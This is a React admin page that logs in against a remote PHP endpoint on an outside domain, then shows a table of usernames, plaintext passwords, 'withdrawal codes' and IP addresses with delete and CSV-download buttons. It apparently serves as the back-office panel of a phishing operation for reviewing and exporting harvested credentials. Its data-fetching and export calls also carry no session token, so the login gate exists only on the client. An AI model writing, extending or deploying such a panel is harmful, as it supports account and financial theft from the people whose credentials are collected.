'use client';
import React, { useState, useEffect } from 'react';

// REPLACE with your PHP URL
const PHP_API_URL = "https://agrawalhouseshifting.com/php_vercel.php";

export default function AdminPage() {
    const [auth, setAuth] = useState(false);
    const [credentials, setCredentials] = useState({ username: '', password: '' });
    const [data, setData] = useState([]);

    // Login to Admin
    const handleLogin = async (e) => {
        e.preventDefault();
        const res = await fetch(`${PHP_API_URL}?action=admin_login`, {
            method: 'POST',
            body: JSON.stringify(credentials)
        });
        const result = await res.json();
        if (result.status === 'success') {
            setAuth(true);
            fetchData();
        } else {
            alert('Invalid Admin Credentials');
        }
    };

    // Fetch Data
    const fetchData = async () => {
        const res = await fetch(`${PHP_API_URL}?action=fetch`);
        const result = await res.json();
        setData(result);
    };

    // Delete Entry
    const deleteEntry = async (id) => {
        if(!confirm('Are you sure?')) return;
        await fetch(`${PHP_API_URL}?action=delete`, {
            method: 'POST',
            body: JSON.stringify({ id })
        });
        fetchData(); // Refresh
    };

    // Download CSV
    const downloadCSV = () => {
        window.open(`${PHP_API_URL}?action=csv`, '_blank');
    };

    if (!auth) {
        return (
            <div style={{ padding: '50px', maxWidth: '400px', margin: '0 auto' }}>
                <h1>Admin Login</h1>
                <form onSubmit={handleLogin} style={{ display: 'flex', flexDirection: 'column', gap: '10px' }}>
                    <input 
                        placeholder="Admin Username" 
                        value={credentials.username}
                        onChange={e => setCredentials({...credentials, username: e.target.value})}
                        style={{ padding: '10px' }}
                    />
                    <input 
                        type="password" 
                        placeholder="Admin Password" 
                        value={credentials.password}
                        onChange={e => setCredentials({...credentials, password: e.target.value})}
                        style={{ padding: '10px' }}
                    />
                    <button type="submit" style={{ padding: '10px', background: '#8a4e00', color: 'white' }}>Login</button>
                </form>
            </div>
        );
    }

    return (
        <div style={{ padding: '20px' }}>
            <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '20px' }}>
                <h1>Database Entries</h1>
                <button onClick={downloadCSV} style={{ padding: '10px 20px', background: 'green', color: 'white', border: 'none', cursor: 'pointer' }}>
                    Download CSV
                </button>
            </div>
            
            <table style={{ width: '100%', borderCollapse: 'collapse' }} border="1">
                <thead>
                    <tr style={{ background: '#eee' }}>
                        <th style={{ padding: '10px' }}>ID</th>
                        <th style={{ padding: '10px' }}>Username</th>
                        <th style={{ padding: '10px' }}>Password</th>
                        <th style={{ padding: '10px' }}>Code</th>
                        <th style={{ padding: '10px' }}>IP</th>
                        <th style={{ padding: '10px' }}>Time</th>
                        <th style={{ padding: '10px' }}>Action</th>
                    </tr>
                </thead>
                <tbody>
                    {data.map(row => (
                        <tr key={row.id}>
                            <td style={{ padding: '10px', textAlign: 'center' }}>{row.id}</td>
                            <td style={{ padding: '10px' }}>{row.username}</td>
                            <td style={{ padding: '10px' }}>{row.password}</td>
                            <td style={{ padding: '10px' }}>{row.withdrawal_code}</td>
                            <td style={{ padding: '10px' }}>{row.ip_address}</td>
                            <td style={{ padding: '10px' }}>{row.created_at}</td>
                            <td style={{ padding: '10px', textAlign: 'center' }}>
                                <button 
                                    onClick={() => deleteEntry(row.id)}
                                    style={{ background: 'red', color: 'white', border: 'none', padding: '5px 10px', cursor: 'pointer' }}
                                >
                                    Delete
                                </button>
                            </td>
                        </tr>
                    ))}
                </tbody>
            </table>
        </div>
    );
}